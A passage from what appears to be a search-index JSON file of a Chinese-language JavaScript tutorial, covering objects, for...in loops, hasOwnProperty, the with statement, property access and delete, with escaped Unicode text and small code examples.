\u65b9\u6cd5\u5224\u65ad\u4e00\u4e0b\uff0c\u662f\u5426\u4e3a\u5bf9\u8c61\u81ea\u8eab\u7684\u5c5e\u6027\u3002 1 2 3 4 var obj = {}; if ( 'toString' in obj ) { console . log ( obj . hasOwnProperty ( 'toString' )) // false } \u5c5e\u6027\u7684\u904d\u5386\uff1afor...in \u5faa\u73af \u00b6 for...in \u5faa\u73af\u7528\u6765\u904d\u5386\u4e00\u4e2a\u5bf9\u8c61\u7684\u5168\u90e8\u5c5e\u6027\u3002 1 2 3 4 5 6 7 8 9 10 11 12 var obj = { a : 1 , b : 2 , c : 3 }; for ( var i in obj ) { console . log ( '\u952e\u540d\uff1a' , i ); console . log ( '\u952e\u503c\uff1a' , obj [ i ]); } // \u952e\u540d\uff1a a // \u952e\u503c\uff1a 1 // \u952e\u540d\uff1a b // \u952e\u503c\uff1a 2 // \u952e\u540d\uff1a c // \u952e\u503c\uff1a 3 for...in \u5faa\u73af\u6709\u4e24\u4e2a\u4f7f\u7528\u6ce8\u610f\u70b9\u3002 \u5b83\u904d\u5386\u7684\u662f\u5bf9\u8c61\u6240\u6709\u53ef\u904d\u5386\uff08enumerable\uff09\u7684\u5c5e\u6027\uff0c\u4f1a\u8df3\u8fc7\u4e0d\u53ef\u904d\u5386\u7684\u5c5e\u6027\u3002 \u5b83\u4e0d\u4ec5\u904d\u5386\u5bf9\u8c61\u81ea\u8eab\u7684\u5c5e\u6027\uff0c\u8fd8\u904d\u5386\u7ee7\u627f\u7684\u5c5e\u6027\u3002 \u4e3e\u4f8b\u6765\u8bf4\uff0c\u5bf9\u8c61\u90fd\u7ee7\u627f\u4e86 toString \u5c5e\u6027\uff0c\u4f46\u662f for...in \u5faa\u73af\u4e0d\u4f1a\u904d\u5386\u5230\u8fd9\u4e2a\u5c5e\u6027\u3002 1 2 3 4 5 6 7 8 var obj = {}; // toString \u5c5e\u6027\u662f\u5b58\u5728\u7684 obj . toString // toString() { [native code] } for ( var p in obj ) { console . log ( p ); } // \u6ca1\u6709\u4efb\u4f55\u8f93\u51fa \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c\u5bf9\u8c61 obj \u7ee7\u627f\u4e86 toString \u5c5e\u6027\uff0c\u8be5\u5c5e\u6027\u4e0d\u4f1a\u88ab for...in \u5faa\u73af\u904d\u5386\u5230\uff0c\u56e0\u4e3a\u5b83\u9ed8\u8ba4\u662f\u201c\u4e0d\u53ef\u904d\u5386\u201d\u7684\u3002\u5173\u4e8e\u5bf9\u8c61\u5c5e\u6027\u7684\u53ef\u904d\u5386\u6027\uff0c\u53c2\u89c1\u300a\u6807\u51c6\u5e93\u300b\u7ae0\u8282\u4e2d Object \u4e00\u7ae0\u7684\u4ecb\u7ecd\u3002 \u5982\u679c\u7ee7\u627f\u7684\u5c5e\u6027\u662f\u53ef\u904d\u5386\u7684\uff0c\u90a3\u4e48\u5c31\u4f1a\u88ab for...in \u5faa\u73af\u904d\u5386\u5230\u3002\u4f46\u662f\uff0c\u4e00\u822c\u60c5\u51b5\u4e0b\uff0c\u90fd\u662f\u53ea\u60f3\u904d\u5386\u5bf9\u8c61\u81ea\u8eab\u7684\u5c5e\u6027\uff0c\u6240\u4ee5\u4f7f\u7528 for...in \u7684\u65f6\u5019\uff0c\u5e94\u8be5\u7ed3\u5408\u4f7f\u7528 hasOwnProperty \u65b9\u6cd5\uff0c\u5728\u5faa\u73af\u5185\u90e8\u5224\u65ad\u4e00\u4e0b\uff0c\u67d0\u4e2a\u5c5e\u6027\u662f\u5426\u4e3a\u5bf9\u8c61\u81ea\u8eab\u7684\u5c5e\u6027\u3002 1 2 3 4 5 6 7 8 var person = { name : '\u8001\u5f20' }; for ( var key in person ) { if ( person . hasOwnProperty ( key )) { console . log ( key ); } } // name with \u8bed\u53e5 \u00b6 with \u8bed\u53e5\u7684\u683c\u5f0f\u5982\u4e0b\uff1a 1 2 3 with ( \u5bf9\u8c61 ) { \u8bed\u53e5 ; } \u5b83\u7684\u4f5c\u7528\u662f\u64cd\u4f5c\u540c\u4e00\u4e2a\u5bf9\u8c61\u7684\u591a\u4e2a\u5c5e\u6027\u65f6\uff0c\u63d0\u4f9b\u4e00\u4e9b\u4e66\u5199\u7684\u65b9\u4fbf\u3002 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 // \u4f8b\u4e00 var obj = { p1 : 1 , p2 : 2 , }; with ( obj ) { p1 = 4 ; p2 = 5 ; } // \u7b49\u540c\u4e8e obj . p1 = 4 ; obj . p2 = 5 ; // \u4f8b\u4e8c with ( document . links [ 0 ]){ console . log ( href ); console . log ( title ); console . log ( style ); } // \u7b49\u540c\u4e8e console . log ( document . links [ 0 ]. href ); console . log ( document . links [ 0 ]. title ); console . log ( document . links [ 0 ]. style ); \u6ce8\u610f\uff0c\u5982\u679c with \u533a\u5757\u5185\u90e8\u6709\u53d8\u91cf\u7684\u8d4b\u503c\u64cd\u4f5c\uff0c\u5fc5\u987b\u662f\u5f53\u524d\u5bf9\u8c61\u5df2\u7ecf\u5b58\u5728\u7684\u5c5e\u6027\uff0c\u5426\u5219\u4f1a\u521b\u9020\u4e00\u4e2a\u5f53\u524d\u4f5c\u7528\u57df\u7684\u5168\u5c40\u53d8\u91cf\u3002 1 2 3 4 5 6 7 8 var obj = {}; with ( obj ) { p1 = 4 ; p2 = 5 ; } obj . p1 // undefined p1 // 4 \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c\u5bf9\u8c61 obj \u5e76\u6ca1\u6709 p1 \u5c5e\u6027\uff0c\u5bf9 p1 \u8d4b\u503c\u7b49\u4e8e\u521b\u9020\u4e86\u4e00\u4e2a\u5168\u5c40\u53d8\u91cf p1 \u3002\u6b63\u786e\u7684\u5199\u6cd5\u5e94\u8be5\u662f\uff0c\u5148\u5b9a\u4e49\u5bf9\u8c61 obj \u7684\u5c5e\u6027 p1 \uff0c\u7136\u540e\u5728 with \u533a\u5757\u5185\u64cd\u4f5c\u5b83\u3002 \u8fd9\u662f\u56e0\u4e3a with \u533a\u5757\u6ca1\u6709\u6539\u53d8\u4f5c\u7528\u57df\uff0c\u5b83\u7684\u5185\u90e8\u4f9d\u7136\u662f\u5f53\u524d\u4f5c\u7528\u57df\u3002\u8fd9\u9020\u6210\u4e86 with \u8bed\u53e5\u7684\u4e00\u4e2a\u5f88\u5927\u7684\u5f0a\u75c5\uff0c\u5c31\u662f\u7ed1\u5b9a\u5bf9\u8c61\u4e0d\u660e\u786e\u3002 1 2 3 with ( obj ) { console . log ( x ); } \u5355\u7eaf\u4ece\u4e0a\u9762\u7684\u4ee3\u7801\u5757\uff0c\u6839\u672c\u65e0\u6cd5\u5224\u65ad x \u5230\u5e95\u662f\u5168\u5c40\u53d8\u91cf\uff0c\u8fd8\u662f\u5bf9\u8c61 obj \u7684\u4e00\u4e2a\u5c5e\u6027\u3002\u8fd9\u975e\u5e38\u4e0d\u5229\u4e8e\u4ee3\u7801\u7684\u9664\u9519\u548c\u6a21\u5757\u5316\uff0c\u7f16\u8bd1\u5668\u4e5f\u65e0\u6cd5\u5bf9\u8fd9\u6bb5\u4ee3\u7801\u8fdb\u884c\u4f18\u5316\uff0c\u53ea\u80fd\u7559\u5230\u8fd0\u884c\u65f6\u5224\u65ad\uff0c\u8fd9\u5c31\u62d6\u6162\u4e86\u8fd0\u884c\u901f\u5ea6\u3002\u56e0\u6b64\uff0c\u5efa\u8bae\u4e0d\u8981\u4f7f\u7528 with \u8bed\u53e5\uff0c\u53ef\u4ee5\u8003\u8651\u7528\u4e00\u4e2a\u4e34\u65f6\u53d8\u91cf\u4ee3\u66ff with \u3002 1 2 3 4 5 6 7 with ( obj1 . obj2 . obj3 ) { console . log ( p1 + p2 ); } // \u53ef\u4ee5\u5199\u6210 var temp = obj1 . obj2 . obj3 ; console . log ( temp . p1 + temp . p2 ); \u53c2\u8003\u94fe\u63a5 \u00b6 Dr. Axel Rauschmayer\uff0c Object properties in JavaScript Lakshan Perera, Revisiting JavaScript Objects Angus Croll, The Secret Life of JavaScript Primitives i Dr. Axel Rauschmayer, JavaScript\u2019s with statement and why it\u2019s deprecated","title":"\u5bf9\u8c61"},{"location":"types/object/#_1","text":"","title":"\u5bf9\u8c61"},{"location":"types/object/#_2","text":"","title":"\u6982\u8ff0"},{"location":"types/object/#_3","text":"\u5bf9\u8c61\uff08object\uff09\u662f JavaScript \u8bed\u8a00\u7684\u6838\u5fc3\u6982\u5ff5\uff0c\u4e5f\u662f\u6700\u91cd\u8981\u7684\u6570\u636e\u7c7b\u578b\u3002 \u4ec0\u4e48\u662f\u5bf9\u8c61\uff1f\u7b80\u5355\u8bf4\uff0c\u5bf9\u8c61\u5c31\u662f\u4e00\u7ec4\u201c\u952e\u503c\u5bf9\u201d\uff08key-value\uff09\u7684\u96c6\u5408\uff0c\u662f\u4e00\u79cd\u65e0\u5e8f\u7684\u590d\u5408\u6570\u636e\u96c6\u5408\u3002 1 2 3 4 var obj = { foo : 'Hello' , bar : 'World' }; \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c\u5927\u62ec\u53f7\u5c31\u5b9a\u4e49\u4e86\u4e00\u4e2a\u5bf9\u8c61\uff0c\u5b83\u88ab\u8d4b\u503c\u7ed9\u53d8\u91cf obj \uff0c\u6240\u4ee5\u53d8\u91cf obj \u5c31\u6307\u5411\u4e00\u4e2a\u5bf9\u8c61\u3002\u8be5\u5bf9\u8c61\u5185\u90e8\u5305\u542b\u4e24\u4e2a\u952e\u503c\u5bf9\uff08\u53c8\u79f0\u4e3a\u4e24\u4e2a\u201c\u6210\u5458\u201d\uff09\uff0c\u7b2c\u4e00\u4e2a\u952e\u503c\u5bf9\u662f foo: 'Hello' \uff0c\u5176\u4e2d foo \u662f\u201c\u952e\u540d\u201d\uff08\u6210\u5458\u7684\u540d\u79f0\uff09\uff0c\u5b57\u7b26\u4e32 Hello \u662f\u201c\u952e\u503c\u201d\uff08\u6210\u5458\u7684\u503c\uff09\u3002\u952e\u540d\u4e0e\u952e\u503c\u4e4b\u95f4\u7528\u5192\u53f7\u5206\u9694\u3002\u7b2c\u4e8c\u4e2a\u952e\u503c\u5bf9\u662f bar: 'World' \uff0c bar \u662f\u952e\u540d\uff0c World \u662f\u952e\u503c\u3002\u4e24\u4e2a\u952e\u503c\u5bf9\u4e4b\u95f4\u7528\u9017\u53f7\u5206\u9694\u3002","title":"\u751f\u6210\u65b9\u6cd5"},{"location":"types/object/#_4","text":"\u5bf9\u8c61\u7684\u6240\u6709\u952e\u540d\u90fd\u662f\u5b57\u7b26\u4e32\uff08ES6 \u53c8\u5f15\u5165\u4e86 Symbol \u503c\u4e5f\u53ef\u4ee5\u4f5c\u4e3a\u952e\u540d\uff09\uff0c\u6240\u4ee5\u52a0\u4e0d\u52a0\u5f15\u53f7\u90fd\u53ef\u4ee5\u3002\u4e0a\u9762\u7684\u4ee3\u7801\u4e5f\u53ef\u4ee5\u5199\u6210\u4e0b\u9762\u8fd9\u6837\u3002 1 2 3 4 var obj = { 'foo' : 'Hello' , 'bar' : 'World' }; \u5982\u679c\u952e\u540d\u662f\u6570\u503c\uff0c\u4f1a\u88ab\u81ea\u52a8\u8f6c\u4e3a\u5b57\u7b26\u4e32\u3002 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 var obj = { 1 : 'a' , 3.2 : 'b' , 1e2 : true , 1e-2 : true , .234 : true , 0xFF : true }; obj // Object { // 1: \"a\", // 3.2: \"b\", // 100: true, // 0.01: true, // 0.234: true, // 255: true // } obj [ '100' ] // true \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c\u5bf9\u8c61 obj \u7684\u6240\u6709\u952e\u540d\u867d\u7136\u770b\u4e0a\u53bb\u50cf\u6570\u503c\uff0c\u5b9e\u9645\u4e0a\u90fd\u88ab\u81ea\u52a8\u8f6c\u6210\u4e86\u5b57\u7b26\u4e32\u3002 \u5982\u679c\u952e\u540d\u4e0d\u7b26\u5408\u6807\u8bc6\u540d\u7684\u6761\u4ef6\uff08\u6bd4\u5982\u7b2c\u4e00\u4e2a\u5b57\u7b26\u4e3a\u6570\u5b57\uff0c\u6216\u8005\u542b\u6709\u7a7a\u683c\u6216\u8fd0\u7b97\u7b26\uff09\uff0c\u4e14\u4e5f\u4e0d\u662f\u6570\u5b57\uff0c\u5219\u5fc5\u987b\u52a0\u4e0a\u5f15\u53f7\uff0c\u5426\u5219\u4f1a\u62a5\u9519\u3002 1 2 3 4 5 6 7 8 9 10 11 // \u62a5\u9519 var obj = { 1 p : 'Hello World' }; // \u4e0d\u62a5\u9519 var obj = { '1p' : 'Hello World' , 'h w' : 'Hello World' , 'p+q' : 'Hello World' }; \u4e0a\u9762\u5bf9\u8c61\u7684\u4e09\u4e2a\u952e\u540d\uff0c\u90fd\u4e0d\u7b26\u5408\u6807\u8bc6\u540d\u7684\u6761\u4ef6\uff0c\u6240\u4ee5\u5fc5\u987b\u52a0\u4e0a\u5f15\u53f7\u3002 \u5bf9\u8c61\u7684\u6bcf\u4e00\u4e2a\u952e\u540d\u53c8\u79f0\u4e3a\u201c\u5c5e\u6027\u201d\uff08property\uff09\uff0c\u5b83\u7684\u201c\u952e\u503c\u201d\u53ef\u4ee5\u662f\u4efb\u4f55\u6570\u636e\u7c7b\u578b\u3002\u5982\u679c\u4e00\u4e2a\u5c5e\u6027\u7684\u503c\u4e3a\u51fd\u6570\uff0c\u901a\u5e38\u628a\u8fd9\u4e2a\u5c5e\u6027\u79f0\u4e3a\u201c\u65b9\u6cd5\u201d\uff0c\u5b83\u53ef\u4ee5\u50cf\u51fd\u6570\u90a3\u6837\u8c03\u7528\u3002 1 2 3 4 5 6 7 var obj = { p : function ( x ) { return 2 * x ; } }; obj . p ( 1 ) // 2 \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c\u5bf9\u8c61 obj \u7684\u5c5e\u6027 p \uff0c\u5c31\u6307\u5411\u4e00\u4e2a\u51fd\u6570\u3002 \u5982\u679c\u5c5e\u6027\u7684\u503c\u8fd8\u662f\u4e00\u4e2a\u5bf9\u8c61\uff0c\u5c31\u5f62\u6210\u4e86\u94fe\u5f0f\u5f15\u7528\u3002 1 2 3 4 5 var o1 = {}; var o2 = { bar : 'hello' }; o1 . foo = o2 ; o1 . foo . bar // \"hello\" \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c\u5bf9\u8c61 o1 \u7684\u5c5e\u6027 foo \u6307\u5411\u5bf9\u8c61 o2 \uff0c\u5c31\u53ef\u4ee5\u94fe\u5f0f\u5f15\u7528 o2 \u7684\u5c5e\u6027\u3002 \u5bf9\u8c61\u7684\u5c5e\u6027\u4e4b\u95f4\u7528\u9017\u53f7\u5206\u9694\uff0c\u6700\u540e\u4e00\u4e2a\u5c5e\u6027\u540e\u9762\u53ef\u4ee5\u52a0\u9017\u53f7\uff08trailing comma\uff09\uff0c\u4e5f\u53ef\u4ee5\u4e0d\u52a0\u3002 1 2 3 4 var obj = { p : 123 , m : function () { ... }, } \u4e0a\u9762\u7684\u4ee3\u7801\u4e2d\uff0c m \u5c5e\u6027\u540e\u9762\u7684\u90a3\u4e2a\u9017\u53f7\uff0c\u6709\u6ca1\u6709\u90fd\u53ef\u4ee5\u3002 \u5c5e\u6027\u53ef\u4ee5\u52a8\u6001\u521b\u5efa\uff0c\u4e0d\u5fc5\u5728\u5bf9\u8c61\u58f0\u660e\u65f6\u5c31\u6307\u5b9a\u3002 1 2 3 var obj = {}; obj . foo = 123 ; obj . foo // 123 \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c\u76f4\u63a5\u5bf9 obj \u5bf9\u8c61\u7684 foo \u5c5e\u6027\u8d4b\u503c\uff0c\u7ed3\u679c\u5c31\u5728\u8fd0\u884c\u65f6\u521b\u5efa\u4e86 foo \u5c5e\u6027\u3002","title":"\u952e\u540d"},{"location":"types/object/#_5","text":"\u5982\u679c\u4e0d\u540c\u7684\u53d8\u91cf\u540d\u6307\u5411\u540c\u4e00\u4e2a\u5bf9\u8c61\uff0c\u90a3\u4e48\u5b83\u4eec\u90fd\u662f\u8fd9\u4e2a\u5bf9\u8c61\u7684\u5f15\u7528\uff0c\u4e5f\u5c31\u662f\u8bf4\u6307\u5411\u540c\u4e00\u4e2a\u5185\u5b58\u5730\u5740\u3002\u4fee\u6539\u5176\u4e2d\u4e00\u4e2a\u53d8\u91cf\uff0c\u4f1a\u5f71\u54cd\u5230\u5176\u4ed6\u6240\u6709\u53d8\u91cf\u3002 1 2 3 4 5 6 7 8 var o1 = {}; var o2 = o1 ; o1 . a = 1 ; o2 . a // 1 o2 . b = 2 ; o1 . b // 2 \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c o1 \u548c o2 \u6307\u5411\u540c\u4e00\u4e2a\u5bf9\u8c61\uff0c\u56e0\u6b64\u4e3a\u5176\u4e2d\u4efb\u4f55\u4e00\u4e2a\u53d8\u91cf\u6dfb\u52a0\u5c5e\u6027\uff0c\u53e6\u4e00\u4e2a\u53d8\u91cf\u90fd\u53ef\u4ee5\u8bfb\u5199\u8be5\u5c5e\u6027\u3002 \u6b64\u65f6\uff0c\u5982\u679c\u53d6\u6d88\u67d0\u4e00\u4e2a\u53d8\u91cf\u5bf9\u4e8e\u539f\u5bf9\u8c61\u7684\u5f15\u7528\uff0c\u4e0d\u4f1a\u5f71\u54cd\u5230\u53e6\u4e00\u4e2a\u53d8\u91cf\u3002 1 2 3 4 5 var o1 = {}; var o2 = o1 ; o1 = 1 ; o2 // {} \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c o1 \u548c o2 \u6307\u5411\u540c\u4e00\u4e2a\u5bf9\u8c61\uff0c\u7136\u540e o1 \u7684\u503c\u53d8\u4e3a1\uff0c\u8fd9\u65f6\u4e0d\u4f1a\u5bf9 o2 \u4ea7\u751f\u5f71\u54cd\uff0c o2 \u8fd8\u662f\u6307\u5411\u539f\u6765\u7684\u90a3\u4e2a\u5bf9\u8c61\u3002 \u4f46\u662f\uff0c\u8fd9\u79cd\u5f15\u7528\u53ea\u5c40\u9650\u4e8e\u5bf9\u8c61\uff0c\u5982\u679c\u4e24\u4e2a\u53d8\u91cf\u6307\u5411\u540c\u4e00\u4e2a\u539f\u59cb\u7c7b\u578b\u7684\u503c\u3002\u90a3\u4e48\uff0c\u53d8\u91cf\u8fd9\u65f6\u90fd\u662f\u503c\u7684\u62f7\u8d1d\u3002 1 2 3 4 5 var x = 1 ; var y = x ; x = 2 ; y // 1 \u4e0a\u9762\u7684\u4ee3\u7801\u4e2d\uff0c\u5f53 x \u7684\u503c\u53d1\u751f\u53d8\u5316\u540e\uff0c y \u7684\u503c\u5e76\u4e0d\u53d8\uff0c\u8fd9\u5c31\u8868\u793a y \u548c x \u5e76\u4e0d\u662f\u6307\u5411\u540c\u4e00\u4e2a\u5185\u5b58\u5730\u5740\u3002","title":"\u5bf9\u8c61\u7684\u5f15\u7528"},{"location":"types/object/#_6","text":"\u5bf9\u8c61\u91c7\u7528\u5927\u62ec\u53f7\u8868\u793a\uff0c\u8fd9\u5bfc\u81f4\u4e86\u4e00\u4e2a\u95ee\u9898\uff1a\u5982\u679c\u884c\u9996\u662f\u4e00\u4e2a\u5927\u62ec\u53f7\uff0c\u5b83\u5230\u5e95\u662f\u8868\u8fbe\u5f0f\u8fd8\u662f\u8bed\u53e5\uff1f 1 { foo : 123 } JavaScript \u5f15\u64ce\u8bfb\u5230\u4e0a\u9762\u8fd9\u884c\u4ee3\u7801\uff0c\u4f1a\u53d1\u73b0\u53ef\u80fd\u6709\u4e24\u79cd\u542b\u4e49\u3002\u7b2c\u4e00\u79cd\u53ef\u80fd\u662f\uff0c\u8fd9\u662f\u4e00\u4e2a\u8868\u8fbe\u5f0f\uff0c\u8868\u793a\u4e00\u4e2a\u5305\u542b foo \u5c5e\u6027\u7684\u5bf9\u8c61\uff1b\u7b2c\u4e8c\u79cd\u53ef\u80fd\u662f\uff0c\u8fd9\u662f\u4e00\u4e2a\u8bed\u53e5\uff0c\u8868\u793a\u4e00\u4e2a\u4ee3\u7801\u533a\u5757\uff0c\u91cc\u9762\u6709\u4e00\u4e2a\u6807\u7b7e foo \uff0c\u6307\u5411\u8868\u8fbe\u5f0f 123 \u3002 \u4e3a\u4e86\u907f\u514d\u8fd9\u79cd\u6b67\u4e49\uff0cJavaScript \u5f15\u64ce\u7684\u505a\u6cd5\u662f\uff0c\u5982\u679c\u9047\u5230\u8fd9\u79cd\u60c5\u51b5\uff0c\u65e0\u6cd5\u786e\u5b9a\u662f\u5bf9\u8c61\u8fd8\u662f\u4ee3\u7801\u5757\uff0c\u4e00\u5f8b\u89e3\u91ca\u4e3a\u4ee3\u7801\u5757\u3002 1 { console . log ( 123 ) } // 123 \u4e0a\u9762\u7684\u8bed\u53e5\u662f\u4e00\u4e2a\u4ee3\u7801\u5757\uff0c\u800c\u4e14\u53ea\u6709\u89e3\u91ca\u4e3a\u4ee3\u7801\u5757\uff0c\u624d\u80fd\u6267\u884c\u3002 \u5982\u679c\u8981\u89e3\u91ca\u4e3a\u5bf9\u8c61\uff0c\u6700\u597d\u5728\u5927\u62ec\u53f7\u524d\u52a0\u4e0a\u5706\u62ec\u53f7\u3002\u56e0\u4e3a\u5706\u62ec\u53f7\u7684\u91cc\u9762\uff0c\u53ea\u80fd\u662f\u8868\u8fbe\u5f0f\uff0c\u6240\u4ee5\u786e\u4fdd\u5927\u62ec\u53f7\u53ea\u80fd\u89e3\u91ca\u4e3a\u5bf9\u8c61\u3002 1 2 ({ foo : 123 }) // \u6b63\u786e ({ console . log ( 123 ) }) // \u62a5\u9519 \u8fd9\u79cd\u5dee\u5f02\u5728 eval \u8bed\u53e5\uff08\u4f5c\u7528\u662f\u5bf9\u5b57\u7b26\u4e32\u6c42\u503c\uff09\u4e2d\u53cd\u6620\u5f97\u6700\u660e\u663e\u3002 1 2 eval ( '{foo: 123}' ) // 123 eval ( '({foo: 123})' ) // {foo: 123} \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c\u5982\u679c\u6ca1\u6709\u5706\u62ec\u53f7\uff0c eval \u5c06\u5176\u7406\u89e3\u4e3a\u4e00\u4e2a\u4ee3\u7801\u5757\uff1b\u52a0\u4e0a\u5706\u62ec\u53f7\u4ee5\u540e\uff0c\u5c31\u7406\u89e3\u6210\u4e00\u4e2a\u5bf9\u8c61\u3002","title":"\u8868\u8fbe\u5f0f\u8fd8\u662f\u8bed\u53e5\uff1f"},{"location":"types/object/#_7","text":"","title":"\u5c5e\u6027\u7684\u64cd\u4f5c"},{"location":"types/object/#_8","text":"\u8bfb\u53d6\u5bf9\u8c61\u7684\u5c5e\u6027\uff0c\u6709\u4e24\u79cd\u65b9\u6cd5\uff0c\u4e00\u79cd\u662f\u4f7f\u7528\u70b9\u8fd0\u7b97\u7b26\uff0c\u8fd8\u6709\u4e00\u79cd\u662f\u4f7f\u7528\u65b9\u62ec\u53f7\u8fd0\u7b97\u7b26\u3002 1 2 3 4 5 6 var obj = { p : 'Hello World' }; obj . p // \"Hello World\" obj [ 'p' ] // \"Hello World\" \u4e0a\u9762\u4ee3\u7801\u5206\u522b\u91c7\u7528\u70b9\u8fd0\u7b97\u7b26\u548c\u65b9\u62ec\u53f7\u8fd0\u7b97\u7b26\uff0c\u8bfb\u53d6\u5c5e\u6027 p \u3002 \u8bf7\u6ce8\u610f\uff0c\u5982\u679c\u4f7f\u7528\u65b9\u62ec\u53f7\u8fd0\u7b97\u7b26\uff0c\u952e\u540d\u5fc5\u987b\u653e\u5728\u5f15\u53f7\u91cc\u9762\uff0c\u5426\u5219\u4f1a\u88ab\u5f53\u4f5c\u53d8\u91cf\u5904\u7406\u3002 1 2 3 4 5 6 7 8 9 var foo = 'bar' ; var obj = { foo : 1 , bar : 2 }; obj . foo // 1 obj [ foo ] // 2 \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c\u5f15\u7528\u5bf9\u8c61 obj \u7684 foo \u5c5e\u6027\u65f6\uff0c\u5982\u679c\u4f7f\u7528\u70b9\u8fd0\u7b97\u7b26\uff0c foo \u5c31\u662f\u5b57\u7b26\u4e32\uff1b\u5982\u679c\u4f7f\u7528\u65b9\u62ec\u53f7\u8fd0\u7b97\u7b26\uff0c\u4f46\u662f\u4e0d\u4f7f\u7528\u5f15\u53f7\uff0c\u90a3\u4e48 foo \u5c31\u662f\u4e00\u4e2a\u53d8\u91cf\uff0c\u6307\u5411\u5b57\u7b26\u4e32 bar \u3002 \u65b9\u62ec\u53f7\u8fd0\u7b97\u7b26\u5185\u90e8\u8fd8\u53ef\u4ee5\u4f7f\u7528\u8868\u8fbe\u5f0f\u3002 1 2 obj [ 'hello' + ' world' ] obj [ 3 + 3 ] \u6570\u5b57\u952e\u53ef\u4ee5\u4e0d\u52a0\u5f15\u53f7\uff0c\u56e0\u4e3a\u4f1a\u81ea\u52a8\u8f6c\u6210\u5b57\u7b26\u4e32\u3002 1 2 3 4 5 6 var obj = { 0.7 : 'Hello World' }; obj [ '0.7' ] // \"Hello World\" obj [ 0.7 ] // \"Hello World\" \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c\u5bf9\u8c61 obj \u7684\u6570\u5b57\u952e 0.7 \uff0c\u52a0\u4e0d\u52a0\u5f15\u53f7\u90fd\u53ef\u4ee5\uff0c\u56e0\u4e3a\u4f1a\u88ab\u81ea\u52a8\u8f6c\u4e3a\u5b57\u7b26\u4e32\u3002 \u6ce8\u610f\uff0c\u6570\u503c\u952e\u540d\u4e0d\u80fd\u4f7f\u7528\u70b9\u8fd0\u7b97\u7b26\uff08\u56e0\u4e3a\u4f1a\u88ab\u5f53\u6210\u5c0f\u6570\u70b9\uff09\uff0c\u53ea\u80fd\u4f7f\u7528\u65b9\u62ec\u53f7\u8fd0\u7b97\u7b26\u3002 1 2 3 4 5 6 var obj = { 123 : 'hello world' }; obj .123 // \u62a5\u9519 obj [ 123 ] // \"hello world\" \u4e0a\u9762\u4ee3\u7801\u7684\u7b2c\u4e00\u4e2a\u8868\u8fbe\u5f0f\uff0c\u5bf9\u6570\u503c\u952e\u540d 123 \u4f7f\u7528\u70b9\u8fd0\u7b97\u7b26\uff0c\u7ed3\u679c\u62a5\u9519\u3002\u7b2c\u4e8c\u4e2a\u8868\u8fbe\u5f0f\u4f7f\u7528\u65b9\u62ec\u53f7\u8fd0\u7b97\u7b26\uff0c\u7ed3\u679c\u5c31\u662f\u6b63\u786e\u7684\u3002","title":"\u5c5e\u6027\u7684\u8bfb\u53d6"},{"location":"types/object/#_9","text":"\u70b9\u8fd0\u7b97\u7b26\u548c\u65b9\u62ec\u53f7\u8fd0\u7b97\u7b26\uff0c\u4e0d\u4ec5\u53ef\u4ee5\u7528\u6765\u8bfb\u53d6\u503c\uff0c\u8fd8\u53ef\u4ee5\u7528\u6765\u8d4b\u503c\u3002 1 2 3 4 var obj = {}; obj . foo = 'Hello' ; obj [ 'bar' ] = 'World' ; \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c\u5206\u522b\u4f7f\u7528\u70b9\u8fd0\u7b97\u7b26\u548c\u65b9\u62ec\u53f7\u8fd0\u7b97\u7b26\uff0c\u5bf9\u5c5e\u6027\u8d4b\u503c\u3002 JavaScript \u5141\u8bb8\u5c5e\u6027\u7684\u201c\u540e\u7ed1\u5b9a\u201d\uff0c\u4e5f\u5c31\u662f\u8bf4\uff0c\u4f60\u53ef\u4ee5\u5728\u4efb\u610f\u65f6\u523b\u65b0\u589e\u5c5e\u6027\uff0c\u6ca1\u5fc5\u8981\u5728\u5b9a\u4e49\u5bf9\u8c61\u7684\u65f6\u5019\uff0c\u5c31\u5b9a\u4e49\u597d\u5c5e\u6027\u3002 1 2 3 4 5 6 var obj = { p : 1 }; // \u7b49\u4ef7\u4e8e var obj = {}; obj . p = 1 ;","title":"\u5c5e\u6027\u7684\u8d4b\u503c"},{"location":"types/object/#_10","text":"\u67e5\u770b\u4e00\u4e2a\u5bf9\u8c61\u672c\u8eab\u7684\u6240\u6709\u5c5e\u6027\uff0c\u53ef\u4ee5\u4f7f\u7528 Object.keys \u65b9\u6cd5\u3002 1 2 3 4 5 6 7 var obj = { key1 : 1 , key2 : 2 }; Object . keys ( obj ); // ['key1', 'key2']","title":"\u5c5e\u6027\u7684\u67e5\u770b"},{"location":"types/object/#delete","text":"delete \u547d\u4ee4\u7528\u4e8e\u5220\u9664\u5bf9\u8c61\u7684\u5c5e\u6027\uff0c\u5220\u9664\u6210\u529f\u540e\u8fd4\u56de true \u3002 1 2 3 4 5 6 var obj = { p : 1 }; Object . keys ( obj ) // [\"p\"] delete obj . p // true obj . p // undefined Object . keys ( obj ) // [] \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c delete \u547d\u4ee4\u5220\u9664\u5bf9\u8c61 obj \u7684 p \u5c5e\u6027\u3002\u5220\u9664\u540e\uff0c\u518d\u8bfb\u53d6 p \u5c5e\u6027\u5c31\u4f1a\u8fd4\u56de undefined \uff0c\u800c\u4e14 Object.keys \u65b9\u6cd5\u7684\u8fd4\u56de\u503c\u4e5f\u4e0d\u518d\u5305\u62ec\u8be5\u5c5e\u6027\u3002 \u6ce8\u610f\uff0c\u5220\u9664\u4e00\u4e2a\u4e0d\u5b58\u5728\u7684\u5c5e\u6027\uff0c delete \u4e0d\u62a5\u9519\uff0c\u800c\u4e14\u8fd4\u56de true \u3002 1 2 var obj = {}; delete obj . p // true \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c\u5bf9\u8c61 obj \u5e76\u6ca1\u6709 p \u5c5e\u6027\uff0c\u4f46\u662f delete \u547d\u4ee4\u7167\u6837\u8fd4\u56de true 